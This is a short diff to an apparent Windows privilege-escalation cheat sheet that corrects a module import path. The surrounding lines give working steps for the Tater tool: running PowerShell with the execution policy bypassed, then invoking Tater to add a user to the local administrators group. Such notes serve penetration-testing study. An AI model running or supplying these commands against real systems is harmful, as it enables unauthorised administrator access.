@@ -95,7 +95,7 @@
 
 - We can use [Tater](https://github.com/Kevin-Robertson/Tater)
 - `powershell.exe -nop -ep bypass`
-- `Import-Module Tater.ps1`
+- `Import-Module .\Tater.ps1`
 - `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
 - Your user should be in the administrators group `net localgroup administrators` to check
 
